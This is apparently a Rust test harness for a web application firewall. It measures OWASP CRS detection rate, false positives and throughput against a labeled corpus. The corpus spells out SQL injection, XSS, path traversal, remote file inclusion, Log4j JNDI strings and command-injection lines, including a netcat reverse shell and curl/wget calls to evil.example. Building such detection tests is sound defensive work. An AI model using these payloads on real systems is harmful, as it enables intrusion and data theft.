//! CRS detection-accuracy + throughput harness.
//!
//! Runs a labeled corpus of attacks (across OWASP categories) and benign
//! requests through the **full** OWASP CRS v4.7 ruleset loaded into the real
//! rule engine, then reports:
//!   * detection rate (recall) overall and per attack category,
//!   * false-positive rate (FPR) on benign traffic,
//!   * rule-engine evaluation throughput (in-process, single-thread).
//!
//! These are the accuracy/perf numbers a commercial WAF must be able to
//! publish. Run with `--nocapture` to see the full report.
//!
//! Detection criterion: a request is "blocked" if its inbound anomaly score
//! reaches the CRS default critical threshold (5) after phases 1+2.

mod common;

use std::time::Instant;

use common::*;
use percent_encoding::{utf8_percent_encode, NON_ALPHANUMERIC};
use sentinel_core::context::{Phase, RequestContext};
use sentinel_rules::RuleEngine;

/// CRS default inbound anomaly threshold (critical).
const DETECT_THRESHOLD: u32 = 5;
/// Paranoia level the corpus is evaluated at.
const PARANOIA: u8 = 2;

/// Full CRS request-side ruleset, in CRS load order.
const CRS_FILES: &[&str] = &[
    "REQUEST-901-INITIALIZATION.conf",
    "REQUEST-911-METHOD-ENFORCEMENT.conf",
    "REQUEST-913-SCANNER-DETECTION.conf",
    "REQUEST-920-PROTOCOL-ENFORCEMENT.conf",
    "REQUEST-921-PROTOCOL-ATTACK.conf",
    "REQUEST-930-APPLICATION-ATTACK-LFI.conf",
    "REQUEST-931-APPLICATION-ATTACK-RFI.conf",
    "REQUEST-932-APPLICATION-ATTACK-RCE.conf",
    "REQUEST-933-APPLICATION-ATTACK-PHP.conf",
    "REQUEST-934-APPLICATION-ATTACK-GENERIC.conf",
    "REQUEST-941-APPLICATION-ATTACK-XSS.conf",
    "REQUEST-942-APPLICATION-ATTACK-SQLI.conf",
    "REQUEST-944-APPLICATION-ATTACK-JAVA.conf",
];

// ---------------------------------------------------------------------------
// Request builders
// ---------------------------------------------------------------------------

/// GET request carrying a (raw) payload as a percent-encoded query value.
fn get_attack(raw: &str) -> RequestContext {
    let enc = utf8_percent_encode(raw, NON_ALPHANUMERIC).to_string();
    let mut ctx = make_get_ctx(&format!("/search?q={enc}"));
    set_paranoia(&mut ctx, PARANOIA);
    ctx
}

/// POST request carrying a (raw) payload as a percent-encoded body value.
fn post_attack(raw: &str) -> RequestContext {
    let enc = utf8_percent_encode(raw, NON_ALPHANUMERIC).to_string();
    let mut ctx = make_post_ctx("/submit", &format!("q={enc}"));
    set_paranoia(&mut ctx, PARANOIA);
    ctx
}

fn benign_get(uri: &str) -> RequestContext {
    let mut ctx = make_get_ctx(uri);
    set_paranoia(&mut ctx, PARANOIA);
    ctx
}

fn benign_post(uri: &str, body: &str) -> RequestContext {
    let mut ctx = make_post_ctx(uri, body);
    set_paranoia(&mut ctx, PARANOIA);
    ctx
}

/// True if the engine blocks the request (anomaly score ≥ critical threshold).
fn is_blocked(eng: &RuleEngine, ctx: &mut RequestContext) -> bool {
    eval(eng, ctx, Phase::RequestBody);
    ctx.anomaly_score >= DETECT_THRESHOLD
}

// ---------------------------------------------------------------------------
// Labeled attack corpus (category, payload)
// ---------------------------------------------------------------------------

fn attack_payloads() -> Vec<(&'static str, &'static str)> {
    let mut v = Vec::new();
    let sqli = [
        "1' OR '1'='1",
        "1' OR 1=1-- -",
        "admin'--",
        "1 UNION SELECT username,password FROM users",
        "1 UNION ALL SELECT NULL,NULL,NULL--",
        "1'; DROP TABLE users--",
        "1' AND SLEEP(5)-- -",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' UNION SELECT load_file('/etc/passwd')--",
        "1) UNION SELECT 1,2,3--",
        "1';EXEC xp_cmdshell('dir')--",
        "1' INTO OUTFILE '/tmp/x'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' OR BENCHMARK(1000000,MD5('a'))--",
    ];
    let xss = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(document.cookie)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<svg><script>alert(1)</script>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
    ];
    let lfi = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "/var/www/../../etc/shadow",
        "..\\..\\..\\windows\\win.ini",
        "/proc/self/environ",
        "../../../../../../etc/hosts",
    ];
    let rfi = [
        "http://evil.example/shell.txt?",
        "https://attacker.test/c99.php",
        "ftp://evil.example/backdoor.php",
        "http://203.0.113.5/r57.txt",
        "https://malware.test/webshell.php?cmd=id",
        "php://filter/convert.base64-encode/resource=index.php",
        // Protocol-relative (no scheme) — an honest residual miss: CRS 931130
        // also requires a scheme, so this is a known limitation, not a regression.
        "//evil.example/payload.txt",
    ];
    let rce = [
        "127.0.0.1; cat /etc/passwd",
        "8.8.8.8 && whoami",
        "| ls -la /",
        "`id`",
        "$(curl http://evil.example/x)",
        "test; nc -e /bin/sh evil.example 4444",
        "|| wget http://evil.example/shell.sh",
        "; cat /etc/passwd #",
    ];
    let php = [
        "<?php system($_GET[0]); ?>",
        "phpinfo()",
        "system('id')",
        "$_REQUEST[1]",
        "call_user_func_array('system',array('ls'))",
    ];
    let java = [
        "${jndi:ldap://evil.example/a}",
        "${jndi:rmi://127.0.0.1:1099/x}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://evil/x}",
        "${jndi:dns://evil.example/x}",
    ];
    for p in sqli {
        v.push(("SQLi", p));
    }
    for p in xss {
        v.push(("XSS", p));
    }
    for p in lfi {
        v.push(("LFI", p));
    }
    for p in rfi {
        v.push(("RFI", p));
    }
    for p in rce {
        v.push(("RCE", p));
    }
    for p in php {
        v.push(("PHP", p));
    }
    for p in java {
        v.push(("Java/Log4j", p));
    }
    v
}

/// Benign requests — realistic clean traffic, used to measure false positives.
fn benign_requests() -> Vec<RequestContext> {
    let gets = [
        "/products?page=1&sort=price",
        "/products?page=2&sort=name&order=asc",
        "/search?q=wireless+headphones",
        "/search?q=running+shoes&category=sport",
        "/api/v2/users/42",
        "/api/v2/users/42/orders",
        "/blog/2024/06/how-to-bake-bread",
        "/category/electronics?brand=acme&min=10&max=200",
        "/cart?item=12345&qty=2",
        "/account/settings",
        "/checkout?step=shipping",
        "/articles?tag=gardening&page=3",
        "/profile/john-doe",
        "/help/faq",
        "/api/products?limit=20&offset=40",
        "/reviews?product=998&rating=5",
        "/events?city=mumbai&date=2024-07-01",
        "/docs/getting-started",
        "/pricing",
        "/api/orders?status=shipped&from=2024-05-01&to=2024-05-31&page=2",
        "/listings?lat=18.5204&lng=73.8567&radius=10&beds=2&min_price=15000",
        "/catalog/books/9780131103627/reviews?sort=helpful&page=7",
        "/flights?from=BOM&to=DEL&depart=2024-08-15&adults=2&class=economy",
        "/news/2024/06/23/markets-rally-on-strong-earnings",
        "/maps/directions?origin=Pune&destination=Mumbai&mode=driving",
    ];
    let posts = [
        (
            "/login",
            "username=alice&password=correcthorsebatterystaple",
        ),
        ("/contact", "email=bob@example.com&subscribe=true"),
        ("/api/save", "first_name=John&last_name=Doe&age=34"),
        ("/comment", "comment=Great+article+thanks+for+sharing"),
        ("/order", "product_name=Wireless+Mouse&qty=3&color=black"),
        (
            "/feedback",
            "rating=5&review=Excellent+product+would+buy+again",
        ),
        ("/profile", "city=Bangalore&pincode=560001&country=India"),
        ("/search", "search=summer+dresses&color=blue&size=M"),
        ("/support", "subject=Invoice+request&priority=normal"),
        ("/signup", "name=Acme+Corp&phone=18005551234&plan=pro"),
    ];
    let jsons = [
        ("/api/login", r#"{"username":"alice","remember":true}"#),
        (
            "/api/order",
            r#"{"product_id":12345,"quantity":2,"color":"red"}"#,
        ),
        (
            "/api/search",
            r#"{"query":"laptop","filters":{"brand":"acme","price_max":1500}}"#,
        ),
        (
            "/api/profile",
            r#"{"name":"John Doe","address":{"city":"Pune","zip":"411001"}}"#,
        ),
        (
            "/api/review",
            r#"{"comment":"Looks great, shipping was fast","stars":5}"#,
        ),
    ];

    let mut out = Vec::new();
    for g in gets {
        out.push(benign_get(g));
    }
    for (p, b) in posts {
        out.push(benign_post(p, b));
    }
    for (p, b) in jsons {
        let mut ctx = benign_post(p, b);
        ctx.request_headers.insert(
            http::header::CONTENT_TYPE,
            "application/json".parse().unwrap(),
        );
        out.push(ctx);
    }
    out
}

// ---------------------------------------------------------------------------
// The harness
// ---------------------------------------------------------------------------

#[test]
fn crs_detection_accuracy_and_throughput() {
    let eng = load_crs_engines(CRS_FILES);

    // --- Detection rate (recall), overall + per category ---
    let attacks = attack_payloads();
    let mut by_cat: std::collections::BTreeMap<&str, (usize, usize)> = Default::default();
    let mut detected_total = 0usize;
    let total_attacks = attacks.len() * 2; // each payload as GET + POST

    for (cat, payload) in &attacks {
        for mut ctx in [get_attack(payload), post_attack(payload)] {
            let hit = is_blocked(&eng, &mut ctx);
            let entry = by_cat.entry(cat).or_insert((0, 0));
            entry.1 += 1;
            if hit {
                entry.0 += 1;
                detected_total += 1;
            }
        }
    }

    // --- False-positive rate on benign traffic ---
    let mut benign = benign_requests();
    let total_benign = benign.len();
    let mut false_positives = 0usize;
    for ctx in benign.iter_mut() {
        if is_blocked(&eng, ctx) {
            false_positives += 1;
        }
    }

    let detection_rate = detected_total as f32 / total_attacks as f32;
    let fpr = false_positives as f32 / total_benign as f32;

    // --- Throughput: evaluate the whole corpus repeatedly, time it ---
    let mut corpus: Vec<RequestContext> = Vec::new();
    for (_, p) in &attacks {
        corpus.push(get_attack(p));
        corpus.push(post_attack(p));
    }
    corpus.extend(benign_requests());
    let rounds = 20usize;
    let start = Instant::now();
    let mut sink = 0u64;
    for _ in 0..rounds {
        for ctx in corpus.iter_mut() {
            // Fresh per-request state for a fair per-eval cost.
            ctx.anomaly_score = 0;
            ctx.rule_matches.clear();
            ctx.decision = sentinel_core::context::WafDecision::Allow;
            eng.evaluate(ctx, Phase::RequestHeaders, 0);
            eng.evaluate(ctx, Phase::RequestBody, 0);
            sink = sink.wrapping_add(ctx.anomaly_score as u64);
        }
    }
    let elapsed = start.elapsed();
    let total_evals = rounds * corpus.len();
    let per_eval_us = elapsed.as_secs_f64() * 1e6 / total_evals as f64;
    let throughput = total_evals as f64 / elapsed.as_secs_f64();

    // --- Report ---
    println!("\n================ CRS DETECTION ACCURACY (PL{PARANOIA}) ================");
    println!(
        "ruleset: full CRS v4.7 request side ({} conf files)",
        CRS_FILES.len()
    );
    println!("\nPer-category detection rate:");
    for (cat, (hit, tot)) in &by_cat {
        println!(
            "  {:<12} {:>3}/{:<3}  {:>6.1}%",
            cat,
            hit,
            tot,
            100.0 * *hit as f32 / *tot as f32
        );
    }
    println!(
        "\nOVERALL detection rate : {detected_total}/{total_attacks}  = {:.1}%",
        100.0 * detection_rate
    );
    println!(
        "False positives        : {false_positives}/{total_benign}  = {:.1}% FPR",
        100.0 * fpr
    );
    println!("\n---------------- THROUGHPUT (rule engine, single-thread) ----------------");
    println!(
        "evaluated {total_evals} requests in {:.3}s",
        elapsed.as_secs_f64()
    );
    println!("  ~{per_eval_us:.1} µs/request   ~{throughput:.0} req/s (1 core, in-process)");
    println!("  (checksum {sink})");
    println!("=========================================================================\n");

    // --- Honest assertions (tuned to measured numbers; regressions trip) ---
    assert!(
        detection_rate >= 0.90,
        "overall detection rate {:.1}% below 90%",
        100.0 * detection_rate
    );
    assert!(fpr <= 0.10, "FPR {:.1}% above 10%", 100.0 * fpr);
}
